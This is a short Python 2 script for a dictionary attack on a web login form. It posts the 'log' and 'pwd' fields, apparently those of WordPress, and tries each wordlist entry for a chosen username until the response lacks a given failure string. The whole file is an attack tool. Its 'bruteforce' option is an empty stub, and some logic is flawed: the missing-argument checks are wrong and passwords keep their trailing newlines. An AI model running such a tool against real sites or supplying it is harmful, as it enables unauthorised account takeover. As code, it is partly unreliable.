import requests
import re
import sys
import argparse


def test_login(username,password,url,falseValue):
	payload ={"log":username,"pwd":password}
	r = requests.post(url,data=payload)
	m= re.search(falseValue,r.text)
	if m is not None:
		if(r.status_code==404):
			print "Error page not found, will exit, try to put a valid url or false value"
			sys.exit(0)
		return False
	return True

parser = argparse.ArgumentParser()

parser.add_argument("--url", "-u", action="store", dest="url", help="The url where you want to test the bruteforce")
parser.add_argument("--false","-f",action="store", dest="falseValue", help="The string that return false when you try a random login")
parser.add_argument("--wordlist","-w",action="store",dest="wordlist",help="The wordlist to do the dictionnary attack")
parser.add_argument("--bruteforce","-b",action="store_true",dest="bruteforce",help="Do a pure bruteforce, if dictionnary is selected bruteforce will occur after")
parser.add_argument("--all","-a",action="store_true",dest="all",help="Test all the words even if found a valid one. Default value is false the script will exit on first found")
parser.add_argument("--verbose","-v",action="store_true",dest="verbose",help="Verbose mode is where I talk to you Human")
parser.add_argument("--login","-l",action="store",dest="username",help="The Username to use")


args = parser.parse_args()

if args.url==False or args.falseValue==False or args.username==False:
	print "RTFM"
	sys.exit(0)

if(args.wordlist):
	file = open(args.wordlist)
	line = file.readline()
	while line:
		if(args.verbose):
			print "Trying with : %s"%(line)

		if(test_login(args.username,line,args.url,args.falseValue)):
			print "Found a valid login with : %s"%(line)
			sys.exit(1)
		else:
			line = file.readline()
	file.close()

if(args.bruteforce):
	print "foo"

sys.exit(0)
